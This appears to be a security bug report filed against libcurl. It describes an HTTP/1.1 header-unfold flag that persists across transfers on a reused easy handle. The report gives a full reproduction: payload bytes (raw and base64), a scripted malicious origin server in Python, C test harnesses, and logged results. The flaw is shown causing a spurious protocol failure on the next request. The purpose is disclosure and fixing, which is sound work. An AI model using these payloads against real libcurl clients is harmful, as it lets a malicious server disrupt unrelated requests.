items.title: HTTP/1.1 unfold state survives across transfers and corrupts the next response
items.body:
### I did this

## Summary

`data->state.leading_unfold` is per-transfer HTTP/1.1 header-unfold state that is set when a folded header line is unfolded, but it is never reset when a new transfer starts on the same `CURL` easy handle. A malicious origin can set the flag and then abort the transfer by sending a response whose header block ends with a folded continuation consisting of a single space (or TAB) followed by connection close, leaving the flag `TRUE` on the handle. The next `curl_easy_perform()` call on that handle — even when it targets a different, legitimate origin — then prepends one space to the next response's status line. With the default `CURLOPT_HTTP09_ALLOWED=0` the innocent request fails with `CURLE_UNSUPPORTED_PROTOCOL` ("Received HTTP/0.9 when not allowed"); with `CURLOPT_HTTP09_ALLOWED=1` the legitimate response's status line and headers are delivered to the write callback as an HTTP/0.9 body. The effect is a one-request parser-integrity/availability defect; no memory corruption or cross-origin data disclosure occurs.

## Reproduction

All PoC files live in `/tmp/curl-unfold-poc/`. The library is built from the checkout at `.` (HEAD `1422236ab5d87ef98452427b6cfb288712e4b182`, curl 8.23.1-DEV) into `./build-release` (gcc, default configuration) and `./build-asan` (clang, ASan+UBSan+LSan, debug, static libcurl).

### 1. Payload files

`/tmp/curl-unfold-poc/write_payloads.py` (Python 3):

```python
leak1 = b'HTTP/1.1 200 OK\r\nContent-Length: 1\r\nX: a\r\n '   # 43 bytes, folded line + lone space
leak1_tab = b'HTTP/1.1 200 OK\r\nContent-Length: 1\r\nX: a\r\n\t'  # 43 bytes, lone TAB variant
ctl1 = b'HTTP/1.1 200 OK\r\nContent-Length: 1\r\nX: a\r\n'       # 42 bytes, control without fold
ok2 = b'HTTP/1.1 200 OK\r\nContent-Length: 0\r\n\r\n'            # 38 bytes, innocent response

for name, data in (('leak1.bin', leak1), ('leak1_tab.bin', leak1_tab),
                   ('ctl1.bin', ctl1), ('ok2.bin', ok2)):
    open(name, 'wb').write(data)
```

Run it:

```
cd /tmp/curl-unfold-poc
python3 write_payloads.py
```

### 2. Malicious/innocent origin server

`/tmp/curl-unfold-poc/seqsrv_b64.py` (Python 3) listens on a loopback port, serves one scripted raw response per accepted connection, and closes after a short delay, so it can serve both the malicious response and the following legitimate one on the same or on distinct ports:

```python
import socket,sys,time,base64
port=int(sys.argv[1]); ps=[base64.b64decode(x) for x in sys.argv[2:]]
s=socket.socket(); s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
s.bind(("127.0.0.1",port)); s.listen(8); print("LISTENING",port,flush=True)
for i,p in enumerate(ps):
    c,_=s.accept(); c.recv(65536); c.sendall(p)
    print("CONN",i,"send",len(p),flush=True)
    time.sleep(0.2); c.close()
```

The payloads are passed base64-encoded:

- `leak1.bin` — `SFRUUC8xLjEgMjAwIE9LDQpDb250ZW50LUxlbmd0aDogMQ0KWDogYQ0KIA==`
- `leak1_tab.bin` — `SFRUUC8xLjEgMjAwIE9LDQpDb250ZW50LUxlbmd0aDogMQ0KWDogYQ0KCQ==`
- `ctl1.bin` — `SFRUUC8xLjEgMjAwIE9LDQpDb250ZW50LUxlbmd0aDogMQ0KWDogYQ0K`
- `ok2.bin` — `SFRUUC8xLjEgMjAwIE9LDQpDb250ZW50LUxlbmd0aDogMA0KDQo=`

### 3. Client harness

`/tmp/curl-unfold-poc/unfold_harness.c` performs two `curl_easy_perform()` calls on one easy handle and reports the result of each. Passing a third argument enables `CURLOPT_HTTP09_ALLOWED=1`:

```c
#include <curl/curl.h>
#include <stdio.h>
static size_t w(char*d,size_t s,size_t n,void*u){return fwrite(d,1,s*n,(FILE*)u);}
int main(int c,char**v){
 CURL*e;int i;curl_global_init(CURL_GLOBAL_ALL);e=curl_easy_init();
 curl_easy_setopt(e,CURLOPT_NOSIGNAL,1L);curl_easy_setopt(e,CURLOPT_TIMEOUT,8L);
 if(c>3)curl_easy_setopt(e,CURLOPT_HTTP09_ALLOWED,1L);
 for(i=1;i<c&&i<3;i++){
  char b[CURL_ERROR_SIZE]={0};long h=0;CURLcode r;
  curl_easy_setopt(e,CURLOPT_URL,v[i]);curl_easy_setopt(e,CURLOPT_ERRORBUFFER,b);
  curl_easy_setopt(e,CURLOPT_WRITEFUNCTION,w);curl_easy_setopt(e,CURLOPT_WRITEDATA,stdout);
  r=curl_easy_perform(e);curl_easy_getinfo(e,CURLINFO_RESPONSE_CODE,&h);
  printf("\n[perform%d] rc=%d (%s) httpcode=%ld errbuf='%s'\n",i,(int)r,curl_easy_strerror(r),h,b);}
 curl_easy_cleanup(e);return 0;}
```

`/tmp/curl-unfold-poc/unfold_reset.c` is the same two-transfer flow but calls the documented `curl_easy_reset()` between the transfers:

```c
#include <curl/curl.h>
#include <stdio.h>
static size_t w(char*d,size_t s,size_t n,void*u){return fwrite(d,1,s*n,(FILE*)u);}
int main(int c,char**v){
 CURL*e;int i;curl_global_init(CURL_GLOBAL_ALL);e=curl_easy_init();
 for(i=1;i<c&&i<3;i++){
  char b[CURL_ERROR_SIZE]={0};long h=0;CURLcode r;
  if(i>1) curl_easy_reset(e);   /* documented reset between transfers */
  curl_easy_setopt(e,CURLOPT_NOSIGNAL,1L);curl_easy_setopt(e,CURLOPT_TIMEOUT,8L);
  curl_easy_setopt(e,CURLOPT_URL,v[i]);curl_easy_setopt(e,CURLOPT_ERRORBUFFER,b);
  curl_easy_setopt(e,CURLOPT_WRITEFUNCTION,w);curl_easy_setopt(e,CURLOPT_WRITEDATA,stdout);
  r=curl_easy_perform(e);curl_easy_getinfo(e,CURLINFO_RESPONSE_CODE,&h);
  printf("\n[perform%d] rc=%d (%s) httpcode=%ld errbuf='%s'\n",i,(int)r,curl_easy_strerror(r),h,b);}
 curl_easy_cleanup(e);return 0;}
```

### 4. Build

Release harness (gcc, default libcurl):

```
cd /tmp/curl-unfold-poc
gcc -O1 -g -DHAVE_CONFIG_H -DDEBUGBUILD -DBUILDING_LIBCURL -DCURL_STATICLIB \
  -I./build-release/lib -I./lib \
  -I./include -I./build-release/include \
  unfold_harness.c ./build-release/lib/.libs/libcurl.a \
  -lnghttp2 -lidn2 -lldap -llber -lssh2 -lpsl -lssl -lcrypto -lzstd \
  -lbrotlidec -lbrotlicommon -lz -lpthread -ldl -o unfold_harness_rel
```

ASan+UBSan harness (clang):

```
clang -O1 -g -fno-omit-frame-pointer -fPIC -DHAVE_CONFIG_H -DDEBUGBUILD \
  -DBUILDING_LIBCURL -DCURL_STATICLIB \
  -I./build-asan/lib -I./lib \
  -I./include -I./build-asan/include \
  -fsanitize=address,undefined,bounds,signed-integer-overflow,leak \
  -fno-sanitize-recover=address,undefined,bounds,signed-integer-overflow \
  unfold_harness.c ./build-asan/lib/.libs/libcurl.a \
  -fsanitize=address,undefined,bounds,signed-integer-overflow,leak \
  -fno-sanitize-recover=address,undefined,bounds,signed-integer-overflow \
  -lnghttp2 -lidn2 -lldap -llber -lssh2 -lpsl -lssl -lcrypto -lzstd \
  -lbrotlidec -lbrotlicommon -lz -lpthread -ldl -o unfold_harness_asan
```

Reset-variant harness (release):

```
gcc -O1 -g -DHAVE_CONFIG_H -DDEBUGBUILD -DBUILDING_LIBCURL -DCURL_STATICLIB \
  -I./build-release/lib -I./lib \
  -I./include -I./build-release/include \
  unfold_reset.c ./build-release/lib/.libs/libcurl.a \
  -lnghttp2 -lidn2 -lldap -llber -lssh2 -lpsl -lssl -lcrypto -lzstd \
  -lbrotlidec -lbrotlicommon -lz -lpthread -ldl -o unfold_reset_rel
```

### 5. Run the scenarios

Same-origin leak, release build (port 19700):

```
python3 seqsrv_b64.py 19700 \
  SFRUUC8xLjEgMjAwIE9LDQpDb250ZW50LUxlbmd0aDogMQ0KWDogYQ0KIA== \
  SFRUUC8xLjEgMjAwIE9LDQpDb250ZW50LUxlbmd0aDogMA0KDQo= > s19700.log 2>&1 &
sleep 0.5
./unfold_harness_rel http://127.0.0.1:19700/a http://127.0.0.1:19700/b; echo "exit=$?"
```

Same-origin leak, ASan+UBSan build (port 19701):

```
python3 seqsrv_b64.py 19701 \
  SFRUUC8xLjEgMjAwIE9LDQpDb250ZW50LUxlbmd0aDogMQ0KWDogYQ0KIA== \
  SFRUUC8xLjEgMjAwIE9LDQpDb250ZW50LUxlbmd0aDogMA0KDQo= > s19701.log 2>&1 &
sleep 0.5
ASAN_OPTIONS=detect_leaks=0:abort_on_error=0 UBSAN_OPTIONS=halt_on_error=0 \
  ./unfold_harness_asan http://127.0.0.1:19701/a http://127.0.0.1:19701/b; echo "exit=$?"
```

Control: same response without the trailing lone space (port 19702):

```
python3 seqsrv_b64.py 19702 \
  SFRUUC8xLjEgMjAwIE9LDQpDb250ZW50LUxlbmd0aDogMQ0KWDogYQ0K \
  SFRUUC8xLjEgMjAwIE9LDQpDb250ZW50LUxlbmd0aDogMA0KDQo= > s19702.log 2>&1 &
sleep 0.5
./unfold_harness_rel http://127.0.0.1:19702/a http://127.0.0.1:19702/b
```

Cross-origin: malicious origin A on 19710, innocent origin B on 19711:

```
python3 seqsrv_b64.py 19710 \
  SFRUUC8xLjEgMjAwIE9LDQpDb250ZW50LUxlbmd0aDogMQ0KWDogYQ0KIA== > s19710.log 2>&1 &
python3 seqsrv_b64.py 19711 \
  SFRUUC8xLjEgMjAwIE9LDQpDb250ZW50LUxlbmd0aDogMA0KDQo= > s19711.log 2>&1 &
sleep 0.5
ASAN_OPTIONS=detect_leaks=0:abort_on_error=0 UBSAN_OPTIONS=halt_on_error=0 \
  ./unfold_harness_asan http://127.0.0.1:19710/a http://127.0.0.1:19711/b
```

`CURLOPT_HTTP09_ALLOWED=1` variant, capturing the write-callback bytes (port 19712):

```
python3 seqsrv_b64.py 19712 \
  SFRUUC8xLjEgMjAwIE9LDQpDb250ZW50LUxlbmd0aDogMQ0KWDogYQ0KIA== \
  SFRUUC8xLjEgMjAwIE9LDQpDb250ZW50LUxlbmd0aDogMA0KDQo= > s19712.log 2>&1 &
sleep 0.5
ASAN_OPTIONS=detect_leaks=0:abort_on_error=0 UBSAN_OPTIONS=halt_on_error=0 \
  ./unfold_harness_asan http://127.0.0.1:19712/a http://127.0.0.1:19712/b http09 > http09.out
od -An -c http09.out
```

TAB variant (port 19713):

```
python3 seqsrv_b64.py 19713 \
  SFRUUC8xLjEgMjAwIE9LDQpDb250ZW50LUxlbmd0aDogMQ0KWDogYQ0KCQ== \
  SFRUUC8xLjEgMjAwIE9LDQpDb250ZW50LUxlbmd0aDogMA0KDQo= > s19713.log 2>&1 &
sleep 0.5
./unfold_harness_rel http://127.0.0.1:19713/a http://127.0.0.1:19713/b
```

`curl_easy_reset()` between transfers (port 19714):

```
python3 seqsrv_b64.py 19714 \
  SFRUUC8xLjEgMjAwIE9LDQpDb250ZW50LUxlbmd0aDogMQ0KWDogYQ0KIA== \
  SFRUUC8xLjEgMjAwIE9LDQpDb250ZW50LUxlbmd0aDogMA0KDQo= > s19714.log 2>&1 &
sleep 0.5
./unfold_reset_rel http://127.0.0.1:19714/a http://127.0.0.1:19714/b
```

`curl` CLI negative control, which uses a fresh easy handle per URL (port 19720):

```
python3 seqsrv_b64.py 19720 \
  SFRUUC8xLjEgMjAwIE9LDQpDb250ZW50LUxlbmd0aDogMQ0KWDogYQ0KIA== \
  SFRUUC8xLjEgMjAwIE9LDQpDb250ZW50LUxlbmd0aDogMA0KDQo= > s19720.log 2>&1 &
sleep 0.5
./build-release/src/curl -sS --max-time 8 \
  -o /dev/null http://127.0.0.1:19720/a -o /dev/null http://127.0.0.1:19720/b
```

Clean up the background servers when done (`kill` the PIDs obtained from `$!`).

### Observed results

**Same-origin, release build (port 19700).** Transfer 1 aborts with `CURLE_PARTIAL_FILE`; transfer 2, which receives a perfectly valid `HTTP/1.1 200 OK` response with `Content-Length: 0`, fails with a protocol error. The process exits 0 (the harness's own exit status); the server log shows both payloads were sent:

```
[perform1] rc=18 (Transferred a partial file) httpcode=200 errbuf='transfer closed with 1 bytes remaining to read'
[perform2] rc=1 (Unsupported protocol) httpcode=0 errbuf='Received HTTP/0.9 when not allowed'
exit=0
s19700.log: LISTENING 19700 / CONN 0 send 43 / CONN 1 send 38
```

**Same-origin, ASan+UBSan build (port 19701).** Identical `rc=18` then `rc=1`, and the sanitizer stderr is empty: no memory-safety, undefined-behavior or leak report.

**Control without the trailing lone space (port 19702).** The first transfer still aborts, but the flag is never set and the second response parses normally, which shows the trailing lone blank byte is the trigger rather than the abort alone:

```
[perform1] rc=18 (Transferred a partial file) httpcode=200 errbuf='transfer closed with 1 bytes remaining to read'
[perform2] rc=0 (No error) httpcode=200 errbuf=''
```

**Cross-origin (malicious 127.0.0.1:19710, innocent 127.0.0.1:19711).** The malicious origin's bytes corrupt the parse of an unrelated origin's response on the same easy handle:

```
[perform1] rc=18 (Transferred a partial file) httpcode=200 errbuf='transfer closed with 1 bytes remaining to read'
[perform2] rc=1 (Unsupported protocol) httpcode=0 errbuf='Received HTTP/0.9 when not allowed'
```

**`CURLOPT_HTTP09_ALLOWED=1` (port 19712).** The second transfer reports no error because the innocent response is reclassified as an HTTP/0.9 body; the captured write-callback bytes are 39 bytes, one injected leading space followed by the legitimate origin's complete status line and headers, and no response body:

```
[perform2] rc=0 (No error) httpcode=0 errbuf=''
body (39 bytes) = " HTTP/1.1 200 OK\r\nContent-Length: 0\r\n\r\n"
```

**TAB variant (port 19713).** A lone TAB as the folded continuation produces the same effect:

```
[perform2] rc=1 (Unsupported protocol) httpcode=0 errbuf='Received HTTP/0.9 when not allowed'
```

**`curl_easy_reset()` between transfers (port 19714).** The documented reset does not clear `data->state.leading_unfold`, so the second transfer still fails:

```
[perform2] rc=1 (Unsupported protocol) httpcode=0 errbuf='Received HTTP/0.9 when not allowed'
```

**`curl` CLI (port 19720).** The command-line tool is unaffected because it opens a fresh easy handle per URL; only the first URL's expected partial-transfer error appears and the second URL parses fine:

```
curl: (18) transfer closed with 1 bytes remaining to read
```

Consequence: a remote malicious origin can reliably turn the next request made on a reused libcurl easy handle into a spurious `CURLE_UNSUPPORTED_PROTOCOL` failure, regardless of the second origin's correctness, or — with the opt-in `CURLOPT_HTTP09_ALLOWED=1` — cause the legitimate response's status line and headers to be delivered as body bytes. No sanitizer finding, memory corruption or cross-origin data disclosure is observed in any run.

## Suspected cause

The affected state is a bitfield in the easy handle: `BIT(leading_unfold); /* unfold started, this is the leading bytes */` at `lib/urldata.h:669`.

Lifecycle of the flag:

- `unfold_header()` sets it after unfolding a folded header line: `Curl_http_to_fold(&data->state.headerb); data->state.leading_unfold = TRUE;` (`lib/http.c:4409-4410`).
- The only site that clears it is the header-line loop, where a non-blank byte following an unfold causes one space to be appended to `headerb` and the flag to be cleared (`lib/http.c:4454-4466`).
- `Curl_http()` resets the sibling parser state for a new transfer — `curlx_dyn_reset(&data->state.headerb); data->state.maybe_folded = FALSE;` (`lib/http.c:3036-3037`) — but does not reset `leading_unfold`.
- The request reset helpers only touch `struct SingleRequest`: `Curl_req_soft_reset` (`lib/request.c:42`) and `Curl_req_hard_reset` (`lib/request.c:112`) do not reach `data->state.leading_unfold`.
- `curl_easy_reset()` (`lib/easy.c:1138-1174`) re-initializes `UserDefined`, progress, `PureInfo`, auth state and calls `Curl_req_hard_reset`, but leaves `data->state.leading_unfold` set.

Attack chain:

1. The parser reads a header block whose last header line ends at the end of the received buffer, which sets `data->state.maybe_folded = TRUE` (`lib/http.c:4553-4556`).
2. On the next read the attacker supplies a single blank byte (space or TAB). It is treated as a fold, so `unfold_header()` sets `leading_unfold = TRUE` (`lib/http.c:4410`).
3. The server closes the connection without sending the promised body, so transfer 1 ends with `CURLE_PARTIAL_FILE` (18) after headers were accepted, and no further header bytes arrive to clear the flag.
4. The application calls `curl_easy_perform()` again on the same easy handle. `Curl_http()` resets `headerb` and `maybe_folded` but not `leading_unfold`, so the stale flag survives.
5. The first non-blank byte of the next response (from origin B) hits the block at `lib/http.c:4454-4466`: one `" "` is appended to `headerb` in place of the status line start. `checkprotoprefix()` therefore sees `" HTTP/1.1 200 OK"` and returns `STATUS_BAD`, producing `CURLE_UNSUPPORTED_PROTOCOL` with "Received HTTP/0.9 when not allowed" (`lib/http.c:4525-4535`).
6. With `CURLOPT_HTTP09_ALLOWED=1` the parser instead treats the prefixed bytes as an HTTP/0.9 body, so origin B's status line and headers reach the application's write callback as body data.

The state lives on the easy handle rather than the connection, so the poison from origin A affects the parse of origin B's response. The effect is one-shot per poisoned transfer: parsing the next response clears the flag. A lone TAB works the same as a space. The exposed bytes are the handler's own parser buffer, not memory from a previous response, and no out-of-bounds access, use-after-free or disclosure was observed.

### Current upstream status

Checked against `curl/curl` master at `d9ab46a9ce57` on 2026-11-09. `data->state.leading_unfold` is still set by header unfolding and is not reset by `Curl_req_soft_reset()` before the next transfer. Earlier unfolding PRs [#20016](https://github.com/curl/curl/pull/20016) and [#20029](https://github.com/curl/curl/pull/20029) do not address cross-transfer state. I found no matching public issue, PR, or fix.

## Impact and limits

Against a standard deployment (default build, documented libcurl API) a malicious HTTP/1.1 origin can force the next request served on the same reused easy handle to fail spuriously with `CURLE_UNSUPPORTED_PROTOCOL`, even when that request goes to a completely unrelated origin that serves a correct response. The attacker's cost is a single 43-byte response; the victim loses one request per poisoned transfer. This is a low-grade availability and parser-integrity defect and is the impact actually observed.

Preconditions, by prevalence:

- **Common:** the attacker can return attacker-chosen HTTP/1.1 response bytes, for example as a malicious origin or an HTTP man-in-the-middle.
- **Common:** the application reuses one `CURL*` easy handle for a second transfer after the first one fails, which libcurl explicitly documents and encourages (`docs/libcurl/curl_easy_perform.md`: "You can do any amount of calls to curl_easy_perform(3) while using the same easy_handle. If you intend to transfer more than one file, you are even encouraged to do so.").
- **Common but not universal:** the second transfer targets a different/unrelated origin, as in crawlers, aggregators and proxies. Without this, the attacker only breaks the next request to itself, which has no impact.
- **Exotic / non-default:** `CURLOPT_HTTP09_ALLOWED=1`. Under this opt-in setting, instead of a clean failure, the innocent origin's status line and response headers (prefixed by one injected space) are handed to `CURLOPT_WRITEFUNCTION` as HTTP/0.9 body bytes. This is a correctness/parser-integrity issue, not a confidentiality or integrity breach, and it is outside the default configuration.

The bug is reachable in the default build through documented reuse of an easy handle with `curl_easy_perform()`. The `curl` command-line tool is not affected because it creates a fresh easy handle per URL (`src/tool_operate.c:1414`). Calling `curl_easy_reset()` between transfers does not clear the flag and does not mitigate the issue. No memory-safety consequence was observed: ASan+UBSan+LSan runs are silent. The severity is therefore bounded at Low.

### I expected the following

Per-response unfolding state should be cleared whenever a transfer starts, ends, or the easy handle is reset. A malformed or truncated response from one origin must not prepend bytes to the status line of the next response processed by the same easy handle.

### curl/libcurl version

curl 8.23.1-DEV at commit `1422236ab5d87ef98452427b6cfb288712e4b182`. The current-source review described above used `d9ab46a9ce572af158613b35afbc7aa7be90c4aa`.

### operating system

Linux x86_64. The exact build configuration and any TLS/backend dependencies used by the reproduction are listed in the reproduction section above.
